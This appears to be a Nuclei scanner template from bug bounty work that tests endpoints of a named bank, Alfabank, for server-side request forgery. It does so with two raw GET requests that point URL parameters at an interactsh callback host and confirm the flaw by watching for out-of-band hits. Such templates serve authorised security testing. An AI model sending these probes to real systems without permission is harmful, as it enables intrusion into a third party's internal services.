id: alfabank-ssrf

info:
  name: Alfabank - SSRF via URL/Callback Parameters
  author: bugbounty
  severity: critical
  description: SSRF in URL parameters with interactsh validation
  tags: ssrf,alfabank
  reference:
    - https://portswigger.net/web-security/ssrf

http:
  - raw:
      - |
        GET /_/ajax/_get_user_city.html?url=http://{{interactsh-url}}/callback HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

      - |
        GET /images?layers=http://{{interactsh-url}}/layer.json HTTP/1.1
        Host: {{Hostname}}
        Accept: image/*,*/*

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: status
        status:
          - 200
          - 201
          - 301
          - 302
          - 500

    extractors:
      - type: regex
        name: interaction
        part: interactsh_request
        regex:
          - '([a-z0-9\-]+)\.([a-z0-9]+)\.interact\.sh'
